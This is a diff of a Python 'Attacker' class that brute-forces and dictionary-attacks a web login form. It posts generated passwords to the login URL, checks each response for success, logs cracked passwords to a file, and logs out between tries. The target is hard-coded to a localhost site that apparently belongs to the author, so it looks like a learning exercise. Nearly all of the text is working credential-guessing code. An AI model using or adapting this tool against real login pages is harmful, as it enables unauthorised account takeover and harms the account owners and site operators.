@@ -5,19 +5,14 @@ import time
 
 
 class Attacker():
-    def __init__(self, loginURL, logoutURL, testMode=True, verbose=False, formTags=["Username", "Password"],
+    def __init__(self, loginURL, logoutURL, formTags=["Username", "Password"],
                  attackMethods={"BruteForceAttack":BruteForceAttack(), "DictionaryAttack":DictionaryAttack()}):
 
         # url of the login page
         self.loginURL = loginURL
 
+        # url of logout page
         self.logoutURL = logoutURL
-
-        # test mode doesn't send the login requests, just gets the passwords
-        self.testMode = testMode
-
-        # prints EVERYTHING out.
-        self.verbose = verbose
 
         # Layout of the login form. You can check this through inspect element. Or if you built the website you can check the code!
         self.formTags = formTags
@@ -40,7 +35,7 @@ class Attacker():
     # successful is a function that the user provides that returns whether the login succeeded or not.
     # def successful(response) -> Boolean
     # this will change for depending on how the website is constructed. For mine just check that "HELLO" is present in response.content
-    def runAttack(self, checkSuccess, attackMethods=None, username=None, findAll=False):
+    def runAttack(self, checkSuccess, attackMethods=None, username=None, findAll=False, testMode=True, verbose=False, log=False):
         print("ATTACKING", self.loginURL)
 
         # stores password've we cracked
@@ -59,41 +54,55 @@ class Attacker():
                 if name not in attackMethods:
                     continue
 
+                # if we are logging, remove the old log file
+                if log:
+                    open(name + ".txt", 'w').close()
+
                 startTime = time.time()
                 print("===========================================================================\n" + str(attackMethod))
 
-                n = 0
-                for password in attackMethod.generatePasswords():
-                    n += 1
-                    if self.testMode:
-                        if self.verbose:
-                            print("TEST MODE: generated password [%s]" % password)
-                        continue
+                # logging if needed
+                with open(name + ".txt", 'a') as file:
+                    count = 0
+                    for password in attackMethod.generatePasswords():
+                        count += 1
+                        if testMode:
+                            if verbose:
+                                print("TEST MODE: generated password [%s]" % password)
+                            continue
 
 
-                    # if username is not passed as argument, we will user the password as our username
-                    self.setDataFields(username, password)
+                        # if username is not passed as argument, we will user the password as our username
+                        self.setDataFields(username, password)
 
-                    response = session.post(self.loginURL, data=self.data)
-                    found = checkSuccess(response)
+                        response = session.post(self.loginURL, data=self.data)
+                        found = checkSuccess(response)
 
-                    if self.verbose:
-                        print("Trying [%s] ... %s" % (password, "SUCCESS" if found else "FAILED"))
+                        if verbose:
+                            print("Trying [%s] ... %s" % (password, "SUCCESS" if found else "FAILED"))
 
-                    if found:
-                        if not self.verbose:
-                            print("Found [%s]" % password)
-                        foundPasswords.add(password)
+                        if found:
+                            file.write(password + "\n")
 
-                        # if we are just brute forcing a single username exit after we found it
-                        if not findAll:
-                            break
+                            if not verbose:
+                                print("Found [%s]" % password)
+                            foundPasswords.add(password)
 
+                            # if we are just brute forcing a single username exit after we found it
+                            if not findAll:
+                                break
 
+                        session.get("http://127.0.0.1:5000/logout")
 
-                    session.get("http://127.0.0.1:5000/logout")
+                    results = "%s generated %d passwords in %s ms. Found %d password:" \
+                              % (name, count, time.time() - startTime, len(foundPasswords))
 
-                print("%s generated %d passwords in %s ms. Found %d password:" % (name, n, time.time() - startTime, len(foundPasswords)))
+                    # log results
+                    if log:
+                        file.write(results)
+
+                    print(results)
+
                 for pw in foundPasswords:
                     print(pw)
 
